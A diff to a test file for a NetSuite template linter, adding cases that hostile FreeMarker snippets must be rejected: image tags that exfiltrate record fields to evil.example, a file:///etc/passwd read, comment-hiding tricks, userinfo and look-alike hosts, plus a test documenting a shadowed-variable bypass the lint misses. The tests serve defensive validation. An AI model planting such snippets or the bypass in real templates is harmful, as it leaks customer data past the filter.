@@ -176,9 +176,27 @@ describe("acceptance loop attempt 3 fixes", () => {
     ["a literal outside host", '<img src="https://evil.example/logo.png"/>', "only NetSuite addresses"],
     ["a protocol-relative outside host", '<img src="//evil.example/logo.png"/>', "only NetSuite addresses"],
     ["an outside host built into a string", `<#assign u = "https://evil.example/" + record.entity>`, "only NetSuite addresses"],
-    ["a file: address", '<img src="file:///etc/passwd"/>', "file: and ftp:"],
+    ["a file: address", '<img src="file:///etc/passwd"/>', "file:, ftp: and jar:"],
+    ["a comment opener inside a string hiding an outside URL", '<#assign a = "<#--"><img src="https://evil.example/${record.entity}"/><#assign b = "-->">', "only NetSuite addresses"],
+    ["a comment opener inside a string hiding ?interpret", '<#assign a = "<#--"><@x?interpret/><#assign b = "-->">', "?interpret"],
+    ["a bracket comment opener hiding an include", '<#assign a = "[#--"><#include "x.ftl"><#assign b = "--]">', "<#include>"],
+    ["an attribute name split by a comment", '<img s<#-- -->rc="https://evil.example/${record.entity}"/>', "only NetSuite addresses"],
+    ["userinfo in front of the host", '<img src="https://x.netsuite.com@evil.example/x.png"/>', "user part"],
+    ["userinfo with a port", '<img src="https://x.netsuite.com:443@evil.example/x.png"/>', "user part"],
+    ["protocol-relative userinfo", '<img src="//x.netsuite.com@evil.example/x.png"/>', "user part"],
+    ["an entity-encoded scheme", '<img src="h&#116;tps://evil.example/x.png"/>', "only NetSuite addresses"],
+    ["a look-alike host", '<img src="https://netsuite.com.evil.example/x.png"/>', "only NetSuite addresses"],
   ])("rejects %s", (_name, snippet, message) => {
     expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: withSnippet(snippet) })).toThrow(message);
+  });
+
+  it("cannot see through a shadowed variable: a documented limit of the lint, closed by PR review and the preview's rendered check", () => {
+    const shadowed = withSnippet('<#assign companyInformation = {"logoUrl": "htt" + "ps://evil.example/" + record.entity}><img src="${companyInformation.logoUrl}"/>');
+    expect(templateSourceIssues(shadowed)).toEqual([]);
+  });
+
+  it("allows a NetSuite address with a port", () => {
+    expect(templateSourceIssues(withSnippet('<img src="https://system.netsuite.com:443/core/media/media.nl?id=1"/>'))).toEqual([]);
   });
 
   it("allows NetSuite fonts and the company logo, the way standard templates load them", () => {
